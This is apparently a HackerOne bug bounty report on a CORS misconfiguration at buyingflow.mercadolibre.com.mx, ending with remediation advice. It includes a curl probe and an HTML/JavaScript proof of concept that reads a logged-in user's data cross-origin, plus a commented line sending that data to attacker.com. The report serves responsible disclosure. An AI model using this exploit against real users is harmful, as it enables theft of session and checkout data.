# HackerOne Submission Template: MercadoLibre

**Program:** MercadoLibre  
**Program URL:** https://hackerone.com/mercadolibre  
**Asset:** `buyingflow.mercadolibre.com.mx` (also reproducible on `.com.co` and `.com.pe`)  
**Vulnerability Type:** Cross-Origin Resource Sharing (CORS) Misconfiguration  
**Weakness:** CWE-942: Permissive Cross-domain Policy with Untrusted Domains  
**Severity:** Medium to High (CVSS 3.1: **7.1** - `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N`)  

---

### Title:
`[CORS Misconfiguration] Arbitrary Origin Reflection with Access-Control-Allow-Credentials Allows Cross-Origin Data Exfiltration on buyingflow.mercadolibre.com.mx`

---

### Summary:
During a perimeter security assessment under MercadoLibre's Responsible Disclosure Program, an insecure Cross-Origin Resource Sharing (CORS) configuration was identified on `buyingflow.mercadolibre.com.mx`.

The server dynamically reads the HTTP `Origin` header supplied by an untrusted external client, echoes that exact origin in `Access-Control-Allow-Origin`, and sets `Access-Control-Allow-Credentials: true`.

When an authenticated victim visits an attacker-controlled website, the attacker's script can issue background cross-origin `fetch()` requests carrying the victim's session cookies and read the complete response data, bypassing the Same-Origin Policy (SOP).

---

### Steps to Reproduce (Proof of Concept):

1. From a terminal or testing environment, send a cross-origin request mimicking an untrusted origin:
   ```bash
   curl -i -s \
     -H "Origin: https://attacker-controlled-site.com" \
     -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
     "https://buyingflow.mercadolibre.com.mx/"
   ```
2. Inspect the HTTP response headers:
   ```http
   HTTP/1.1 200 OK
   Access-Control-Allow-Origin: https://attacker-controlled-site.com
   Access-Control-Allow-Credentials: true
   Vary: Origin
   ```
3. **HTML / JavaScript Exploit PoC:**
   Host the following HTML snippet on `https://attacker-controlled-site.com/exploit.html`:
   ```html
   <!DOCTYPE html>
   <html>
   <head><title>CORS PoC</title></head>
   <body>
     <h1>CORS Data Exfiltration Demo</h1>
     <script>
       fetch('https://buyingflow.mercadolibre.com.mx/', {
         method: 'GET',
         credentials: 'include'
       })
       .then(response => response.text())
       .then(data => {
         console.log('Exfiltrated cross-origin data:', data);
         // Attacker exfiltrates data:
         // fetch('https://attacker.com/log?leak=' + encodeURIComponent(data));
       });
     </script>
   </body>
   </html>
   ```
4. A logged-in user navigating to the page will have their authenticated state read cross-origin.

---

### Impact:
An external adversary can force authenticated users visiting any third-party website to make background requests to MercadoLibre buyingflow services. Because `credentials: true` is enabled alongside arbitrary origin reflection, the browser allows the malicious site to read response bodies, potentially leaking user session identifiers, shipping details, or checkout metadata.

---

### Remediation:
1. Validate incoming `Origin` headers against a strict, static server-side whitelist of authorized MercadoLibre domains (e.g. `*.mercadolibre.com`).
2. Never blindly echo the incoming `Origin` header in `Access-Control-Allow-Origin` when `Access-Control-Allow-Credentials` is set to `true`.
3. If public unauthenticated access is required, omit `Access-Control-Allow-Credentials` entirely.
